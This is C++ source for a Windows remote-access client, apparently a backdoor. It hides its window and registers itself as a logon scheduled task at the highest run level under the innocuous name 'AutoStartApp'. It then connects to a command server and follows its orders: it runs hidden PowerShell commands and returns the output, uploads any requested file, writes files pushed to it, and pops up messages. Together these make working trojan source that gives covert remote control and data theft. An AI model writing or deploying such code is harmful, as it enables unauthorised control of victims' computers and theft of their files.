#include <SFML/Network.hpp>
#include <string>
#include <vector>
#include <thread>
#include <map>
#include <unordered_map>
#include <mutex>
#include <queue>
#include <variant>
#include <atomic>
#include <iostream>
#include <Windows.h>
#include <nlohmann/json.hpp>
#include <format>
#include <fstream>
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

#define FILE_CHUNK_SIZE 1024 * 1024

size_t min(size_t n1, size_t n2) { return n1 < n2 ? n1 : n2; }
size_t max(size_t n1, size_t n2) { return n1 > n2 ? n1 : n2; }

using json = nlohmann::json;

std::vector<std::string> chunkedFile(std::string fileDir) {
	std::vector<std::string> ret;
	std::string buffer;
	std::ifstream file(fileDir.c_str(), std::ios::binary | std::ios::ate);
	if (!file) return ret;
	size_t fileSize = file.tellg();
	file.seekg(0);

	size_t realSize = 0;
	for (size_t offset = 0; offset < fileSize; offset += FILE_CHUNK_SIZE) {
		realSize = min(FILE_CHUNK_SIZE, fileSize - offset);
		buffer.resize(realSize);
		file.read(buffer.data(), realSize);
		ret.push_back(buffer);
	}
	file.close();
	return ret;
}

std::string ExecuteCommand(const std::string& command) {
	// Создаем каналы для потоков
	HANDLE hReadPipe, hWritePipe;
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	CreatePipe(&hReadPipe, &hWritePipe, &sa, 0);

	// Настраиваем процесс
	STARTUPINFOA si = { sizeof(STARTUPINFOA) };
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.hStdOutput = hWritePipe;
	si.hStdError = hWritePipe;
	si.wShowWindow = SW_HIDE;

	PROCESS_INFORMATION pi;
	std::string cmd = "powershell.exe \"[Console]::OutputEncoding = [System.Text.Encoding]::UTF8\"; \"" + command + "\""; // Для PowerShell: "powershell.exe -Command \"" + command + "\""

	// Создаем процесс
	if (!CreateProcessA(
		NULL,
		cmd.data(),
		NULL,
		NULL,
		TRUE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi
	)) {
		CloseHandle(hWritePipe);
		CloseHandle(hReadPipe);
		return "Error creating process";
	}

	// Закрываем ненужные дескрипторы
	CloseHandle(hWritePipe);

	// Читаем вывод
	std::string output;
	char buffer[4096];
	DWORD bytesRead;
	while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
		buffer[bytesRead] = '\0';
		output += buffer;
	}

	// Ожидаем завершения и закрываем дескрипторы
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hReadPipe);

	return output;
}

#include <windows.h>
#include <taskschd.h>
#include <comutil.h>
#include <iostream>
#include <string>
#include <vector>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "ole32.lib")

// Функция для получения пути к текущему исполняемому файлу
std::wstring GetExecutablePath() {
	std::vector<wchar_t> buffer(MAX_PATH);
	DWORD result = GetModuleFileNameW(nullptr, buffer.data(), MAX_PATH);

	// Обработка длинных путей
	if (result >= MAX_PATH && GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
		buffer.resize(32767); // Максимальная длина пути в Windows
		result = GetModuleFileNameW(nullptr, buffer.data(), static_cast<DWORD>(buffer.size()));
	}

	if (result == 0) {
		DWORD error = GetLastError();
		std::cerr << "GetModuleFileName failed. Error: " << error << std::endl;
		return L"";
	}

	return std::wstring(buffer.data());
}

bool AddExeToAutoStartViaTaskScheduler(const std::wstring& exePath) {
	HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (FAILED(hr)) {
		std::cerr << "COM initialization failed. Error: " << hr << std::endl;
		return false;
	}

	ITaskService* pService = nullptr;
	hr = CoCreateInstance(
		CLSID_TaskScheduler,
		NULL,
		CLSCTX_INPROC_SERVER,
		IID_ITaskService,
		(void**)&pService
	);
	if (FAILED(hr)) {
		std::cerr << "Failed to create Task Scheduler instance. Error: " << hr << std::endl;
		CoUninitialize();
		return false;
	}

	hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
	if (FAILED(hr)) {
		std::cerr << "Failed to connect to Task Scheduler. Error: " << hr << std::endl;
		pService->Release();
		CoUninitialize();
		return false;
	}

	ITaskFolder* pRootFolder = nullptr;
	hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
	if (FAILED(hr)) {
		std::cerr << "Failed to get root folder. Error: " << hr << std::endl;
		pService->Release();
		CoUninitialize();
		return false;
	}

	// Создание задачи
	ITaskDefinition* pTask = nullptr;
	hr = pService->NewTask(0, &pTask);
	pService->Release();
	if (FAILED(hr)) {
		std::cerr << "Failed to create task definition. Error: " << hr << std::endl;
		pRootFolder->Release();
		CoUninitialize();
		return false;
	}

	// Настройка информации о задаче
	IRegistrationInfo* pRegInfo = nullptr;
	hr = pTask->get_RegistrationInfo(&pRegInfo);
	if (SUCCEEDED(hr)) {
		pRegInfo->put_Author(_bstr_t(L"AutoStart Manager"));
		pRegInfo->Release();
	}

	// Настройка параметров запуска
	IPrincipal* pPrincipal = nullptr;
	hr = pTask->get_Principal(&pPrincipal);
	if (SUCCEEDED(hr)) {
		pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
		pPrincipal->Release();
	}

	// Настройка триггера (при входе в систему)
	ITriggerCollection* pTriggerCollection = nullptr;
	hr = pTask->get_Triggers(&pTriggerCollection);
	if (FAILED(hr)) {
		std::cerr << "Failed to get triggers collection. Error: " << hr << std::endl;
		pTask->Release();
		pRootFolder->Release();
		CoUninitialize();
		return false;
	}

	ITrigger* pTrigger = nullptr;
	hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
	pTriggerCollection->Release();
	if (FAILED(hr)) {
		std::cerr << "Failed to create logon trigger. Error: " << hr << std::endl;
		pTask->Release();
		pRootFolder->Release();
		CoUninitialize();
		return false;
	}

	// Настройка действия (запуск exe)
	IActionCollection* pActionCollection = nullptr;
	hr = pTask->get_Actions(&pActionCollection);
	if (FAILED(hr)) {
		std::cerr << "Failed to get actions collection. Error: " << hr << std::endl;
		pTrigger->Release();
		pTask->Release();
		pRootFolder->Release();
		CoUninitialize();
		return false;
	}

	IAction* pAction = nullptr;
	hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
	pActionCollection->Release();
	if (FAILED(hr)) {
		std::cerr << "Failed to create executable action. Error: " << hr << std::endl;
		pTrigger->Release();
		pTask->Release();
		pRootFolder->Release();
		CoUninitialize();
		return false;
	}

	IExecAction* pExecAction = nullptr;
	hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
	pAction->Release();
	if (SUCCEEDED(hr)) {
		pExecAction->put_Path(_bstr_t(exePath.c_str()));
		pExecAction->Release();
	}

	// Регистрация задачи
	IRegisteredTask* pRegisteredTask = nullptr;
	hr = pRootFolder->RegisterTaskDefinition(
		_bstr_t(L"AutoStartApp"),  // Имя задачи
		pTask,
		TASK_CREATE_OR_UPDATE,
		_variant_t(L"S-1-5-32-545"), // Группа "Пользователи"
		_variant_t(),
		TASK_LOGON_GROUP,
		_variant_t(L""),
		&pRegisteredTask
	);

	bool success = SUCCEEDED(hr);
	if (!success) {
		std::cerr << "Failed to register task. Error: " << hr << std::endl;
	}

	// Проверка существования задачи
	if (success) {
		IRegisteredTask* pExistingTask = nullptr;
		hr = pRootFolder->GetTask(_bstr_t(L"AutoStartApp"), &pExistingTask);
		if (SUCCEEDED(hr)) {
			std::wcout << L"Task verification successful!" << std::endl;
			pExistingTask->Release();
		}
		else {
			std::cerr << "Task verification failed. Error: " << hr << std::endl;
			success = false;
		}
		pRegisteredTask->Release();
	}

	// Освобождение ресурсов
	pTrigger->Release();
	pTask->Release();
	pRootFolder->Release();
	CoUninitialize();

	return success;
}


void RunInThread(const std::string& command) {
	std::string result = ExecuteCommand(command);
	std::cout << std::format("Command output:\n{}\n", result);
}

class ClientsQueue {
private:
	std::queue<std::string> queue;
	std::mutex queueMutex;

public:
	void push(const std::string& msg) {
		std::lock_guard<std::mutex> lock(queueMutex);
		queue.push(msg);
	}

	void push(std::queue<std::string>& msg) {
		std::lock_guard<std::mutex> lock(queueMutex);
		while (!msg.empty()) {
			queue.push(msg.front());
			msg.pop();
		}
	}

	void push(const std::vector<std::string>& msg) {
		std::lock_guard<std::mutex> lock(queueMutex);
		for (size_t i = 0; i < msg.size(); i++)
			queue.push(msg[i]);
	}

	std::string& front() {
		std::lock_guard<std::mutex> lock(queueMutex);
		return queue.front();
	}

	void pop() {
		std::lock_guard<std::mutex> lock(queueMutex);
		queue.pop();
	}

	bool empty() {
		std::lock_guard<std::mutex> lock(queueMutex);
		return queue.empty();
	}

	auto& getMutex() { return queueMutex; }
	auto& getQueue() { return queue; }
};

class Client {
public:
	sf::TcpSocket* sock;
	sf::IpAddress ip;
	unsigned __int16 port;
	std::thread connectThread;
	sf::Socket::Status status = sf::Socket::Status::Disconnected;

	std::thread outputThread;
	std::thread  inputThread;
	ClientsQueue output;
	ClientsQueue  input;
	std::atomic<bool> active;
	std::vector<std::string> buffer;
	std::vector<std::string> filesSending;

	void stop() {
		//  shutdown signal
		active = false;

		sock->disconnect();
		//  shutdown threads
		outputThread.join();
		inputThread.join();
		connectThread.join();
	}

	void start() {
		active = true;
		outputThread = std::thread([&]() {
			std::string str;
			sf::Socket::Status st;
			while (active.load()) {
				if (output.empty()) {
					std::this_thread::sleep_for(std::chrono::milliseconds(5));
					continue;
				}

				str = output.front();
				if (str.empty()) break;
				sf::Packet p; p << str;  output.pop();


			sending:
				if (!active.load()) break;
				st = sock->send(p);
				if (st == sf::Socket::Status::Error || st == sf::Socket::Status::Partial || st == sf::Socket::Status::NotReady) {
					std::this_thread::sleep_for(std::chrono::milliseconds(5));
					goto sending;
				}
				else if (st == sf::Socket::Status::Disconnected) {
					status = sf::Socket::Status::Disconnected;
					goto sending;
				}
			}
			});

		inputThread = std::thread([&]() {
			std::string str;
			sf::Socket::Status st;
			while (active.load()) {
				sf::Packet p;

			receiving:
				if (!active.load()) break;

				st = sock->receive(p);
				if (st == sf::Socket::Status::Error || st == sf::Socket::Status::NotReady || st == sf::Socket::Status::Partial) {
					std::this_thread::sleep_for(std::chrono::milliseconds(5));
					goto receiving;
				}
				else if (st == sf::Socket::Status::Disconnected) {
					status = sf::Socket::Status::Disconnected;
					goto receiving;
				}

				p >> str;  input.push(str);
				std::cout << std::format("from server {}:{} new message received:\n{}\n", sock->getRemoteAddress().value().toString(), sock->getLocalPort(), str);
			}
			});

		connectThread = std::thread([&]() {
			while (active.load()) {
				while (status == sf::Socket::Status::Done && active.load()) std::this_thread::sleep_for(std::chrono::seconds(5));
				if (!active.load()) break;

				status = sock->connect(ip, port);
			}
			
			});
	}

	Client(sf::TcpSocket* sock) : sock(sock), ip(sock->getRemoteAddress().value()), port(sock->getRemotePort()) {
		start();
	}

	Client(sf::IpAddress ip, unsigned short port) : sock(new sf::TcpSocket), ip(ip), port(port) {
		start();
	}

	~Client() {
		stop();
		sock->disconnect();
		delete sock;
	}

};

void processPacket(std::string msg, Client* cl) {
	try {
		json answer;
		if (msg.size() >= 3 &&
			static_cast<unsigned char>(msg[0]) == 0xEF &&
			static_cast<unsigned char>(msg[1]) == 0xBB &&
			static_cast<unsigned char>(msg[2]) == 0xBF) {
			answer = json::parse(msg.substr(3));
		}
		else {
			answer = json::parse(msg);
		}
		

		if (!answer.contains("action") && true) {
			std::cerr << std::format("invalid json format from server (no module action). message:\n{}\n", msg);
			return;
		}
		std::string action = answer["action"];
		if (!answer.contains("message") && true) {
			std::cerr << std::format("invalid json format from server (no module message). message:\n{}\n", msg);
			return;
		}

		if (action == "message") {
			MessageBox(NULL, answer["message"].get<std::string>().c_str(), "Сообщение", MB_OK);
		}
		else if (action == "cmd") {
			std::string out = ExecuteCommand(answer["message"].get<std::string>());
			std::cout << std::format("command executing result:\n{}\n", out);
			json p = {
				{"action", "cmdlog"},
				{"message", out} 
			};
			cl->output.push(p.dump());
		}
		else if (action == "recvfile") {
			if (!answer.contains("message") || !answer.contains("path")) {
				std::cerr << std::format("invalid json format from server (no module message/path). message:\n{}\n", msg);
				return;
			}

			std::string homepath = answer["message"];
			std::string endpath = answer["path"];

			auto chunked = chunkedFile(homepath);
			{
				std::lock_guard<std::mutex> lock(cl->output.getMutex());
				for (size_t i = 0; i < chunked.size(); i++) {
					json req = {
						{"action", "recvfile"},
						{"message", chunked[i]},
						{"path", endpath},
						{"isfinal", (i + 1 == chunked.size())}
					};
					cl->output.getQueue().push(req.dump());
				}
			}
		}
		else if (action == "sendfile") {
			if (!answer.contains("message") || !answer.contains("path") || !answer.contains("isfinal")) {
				std::cerr << std::format("invalid json format from server (no module message/path/isfinal). message:\n{}\n", msg);
				return;
			}

			std::string message = answer["message"];
			cl->buffer.push_back(message);
			if (bool isfinal = answer["isfinal"]) {
				std::ofstream file(answer["path"].get<std::string>(), 'w');
				for (auto& chunk : cl->buffer) {
					file << chunk;
				}
				cl->buffer.clear();
				file.close();
			}
		}
	}
	catch (const std::exception& e) {
		std::cerr << std::format("invalid json format from server. Error:\n{}\n message:\n{}\n", e.what(), msg);
	}
}

int main() {
	Client client(sf::IpAddress::resolve("127.0.0.1").value(), 8080);

	auto mypath = GetExecutablePath();
	if (AddExeToAutoStartViaTaskScheduler(mypath)) {
		std::cout << "autostart: on\n";
	}
	else {
		std::cerr << "cant enable autostart!\n";
		return 1;
	}

	system("chcp 65001");
	while (true) {
		while (client.input.empty()) std::this_thread::sleep_for(std::chrono::milliseconds(100));
		std::string msg = client.input.front();  client.input.pop();
		processPacket(msg, &client);
	}
	return 0;
}